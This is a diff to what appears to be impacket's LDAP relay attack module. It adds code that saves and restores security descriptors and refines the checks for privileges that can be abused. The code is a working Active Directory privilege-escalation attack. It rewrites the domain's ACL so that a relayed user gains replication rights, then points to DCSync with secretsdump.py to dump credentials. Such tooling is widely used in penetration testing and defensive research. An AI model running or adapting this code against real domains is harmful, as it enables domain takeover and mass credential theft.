@@ -18,6 +18,11 @@
 import random
 import string
 import thread
+import json
+import datetime
+import binascii
+import codecs
+import re
 import ldapdomaindump
 import ldap3
 from impacket import LOG
@@ -49,6 +54,16 @@ class LDAPAttack(ProtocolAttack):
     If the user is an Enterprise or Domain admin, a new user is added to escalate to DA.
     """
     PLUGIN_NAMES = ["LDAP", "LDAPS"]
+
+    # ACL constants
+    # When reading, these constants are actually represented by
+    # the following for Active Directory specific Access Masks
+    # Reference: https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2
+    GENERIC_READ            = 0x00020094
+    GENERIC_WRITE           = 0x00020028
+    GENERIC_EXECUTE         = 0x00020004
+    GENERIC_ALL             = 0x000F01FF
+
     def __init__(self, config, LDAPClient, username):
         ProtocolAttack.__init__(self, config, LDAPClient, username)
 
@@ -118,6 +133,9 @@ class LDAPAttack(ProtocolAttack):
             LOG.error('ACL attack already performed. Refusing to continue')
             return
 
+        # Dictionary for restore data
+        restoredata = {}
+
         # Query for the sid of our user
         self.client.search(userDn, '(objectCategory=user)', attributes=['sAMAccountName', 'objectSid'])
         entry = self.client.entries[0]
@@ -135,6 +153,10 @@ class LDAPAttack(ProtocolAttack):
         secDescData = entry['nTSecurityDescriptor'].raw_values[0]
         secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
 
+        # Save old SD for restore purposes
+        restoredata['old_sd'] = binascii.hexlify(secDescData).decode('utf-8')
+        restoredata['target_sid'] = usersid
+
         secDesc['Dacl']['Data'].append(create_object_ace('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', usersid))
         secDesc['Dacl']['Data'].append(create_object_ace('1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', usersid))
         dn = entry.entry_dn
@@ -142,12 +164,34 @@ class LDAPAttack(ProtocolAttack):
         self.client.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
         if self.client.result['result'] == 0:
             alreadyEscalated = True
-            LOG.info('Success! User %s now has Replication-Get-Changes-All privileges on the domain' % username)
+            LOG.info('Success! User %s now has Replication-Get-Changes-All privileges on the domain', username)
             LOG.info('Try using DCSync with secretsdump.py and this user :)')
+
+            # Query the SD again to see what AD made of it
+            self.client.search(domainDumper.root, '(&(objectCategory=domain))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
+            entry = self.client.entries[0]
+            newSD = entry['nTSecurityDescriptor'].raw_values[0]
+            # Save this to restore the SD later on
+            restoredata['target_dn'] = dn
+            restoredata['new_sd'] = binascii.hexlify(newSD).decode('utf-8')
+            restoredata['success'] = True
+            self.writeRestoreData(restoredata, dn)
             return True
         else:
             LOG.error('Error when updating ACL: %s' % self.client.result)
             return False
+
+    def writeRestoreData(self, restoredata, domaindn):
+        output = {}
+        domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
+        output['config'] = {'server':self.client.server.host,'domain':domain}
+        output['history'] = [{'operation': 'add_domain_sync', 'data': restoredata, 'contextuser': self.username}]
+        now = datetime.datetime.now()
+        filename = 'aclpwn-%s.restore' % now.strftime("%Y%m%d-%H%M%S")
+        # Save the json to file
+        with codecs.open(filename, 'w', 'utf-8') as outfile:
+            json.dump(output, outfile)
+        LOG.info('Saved restore state to %s', filename)
 
     def validatePrivileges(self, uname, domainDumper):
         # Find the user's DN
@@ -221,6 +265,12 @@ class LDAPAttack(ProtocolAttack):
             return False
 
     def checkSecurityDescriptors(self, entries, privs, membersids, sidmapping, domainDumper):
+        standardrights = [
+            self.GENERIC_ALL,
+            self.GENERIC_WRITE,
+            self.GENERIC_READ,
+            ACCESS_MASK.WRITE_DACL
+        ]
         for entry in entries:
             if entry['type'] != 'searchResEntry':
                 continue
@@ -250,10 +300,23 @@ class LDAPAttack(ProtocolAttack):
                     and ace.hasFlag(ACE.INHERITED_ACE) \
                     and ace['Ace'].hasFlag(ACCESS_ALLOWED_OBJECT_ACE.ACE_INHERITED_OBJECT_TYPE_PRESENT):
                     # Verify if the ACE applies to this object type
-                    if not self.aceApplies(ace, entry['raw_attributes']['objectClass']):
+                    inheritedObjectType = bin_to_string(ace['Ace']['InheritedObjectType']).lower()
+                    if not self.aceApplies(inheritedObjectType, entry['raw_attributes']['objectClass'][-1]):
                         continue
-
+                # Check for non-extended rights that may not apply to us
+                if ace['Ace']['Mask']['Mask'] in standardrights or ace['Ace']['Mask'].hasPriv(ACCESS_MASK.WRITE_DACL):
+                    # Check if this applies to our objecttype
+                    if ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE  and ace['Ace'].hasFlag(ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT):
+                        objectType = bin_to_string(ace['Ace']['ObjectType']).lower()
+                        if not self.aceApplies(objectType, entry['raw_attributes']['objectClass'][-1]):
+                            # LOG.debug('ACE does not apply, only to %s', objectType)
+                            continue
                 if sid in membersids:
+                    # Generic all
+                    if ace['Ace']['Mask'].hasPriv(self.GENERIC_ALL):
+                        ace.dump()
+                        LOG.debug('Permission found: Full Control on %s; Reason: GENERIC_ALL via %s' % (dn, sidmapping[sid]))
+                        hasFullControl = True
                     if can_create_users(ace) or hasFullControl:
                         if not hasFullControl:
                             LOG.debug('Permission found: Create users in %s; Reason: Granted to %s' % (dn, sidmapping[sid]))
@@ -283,16 +346,18 @@ class LDAPAttack(ProtocolAttack):
                             privs['aclEscalateIn'] = dn
 
     @staticmethod
-    def aceApplies(ace, objectClasses):
+    def aceApplies(ace_guid, object_class):
         '''
         Checks if an ACE applies to this object (based on object classes).
         Note that this function assumes you already verified that InheritedObjectType is set (via the flag).
         If this is not set, the ACE applies to all object types.
         '''
-        objectTypeGuid = bin_to_string(ace['Ace']['InheritedObjectType']).lower()
-        for objectType, guid in OBJECTTYPE_GUID_MAP.iteritems():
-            if objectType in objectClasses and objectTypeGuid:
-                return True
+        try:
+            our_ace_guid = OBJECTTYPE_GUID_MAP[object_class]
+        except KeyError:
+            return False
+        if ace_guid == our_ace_guid:
+            return True
         # If none of these match, the ACE does not apply to this object
         return False
 
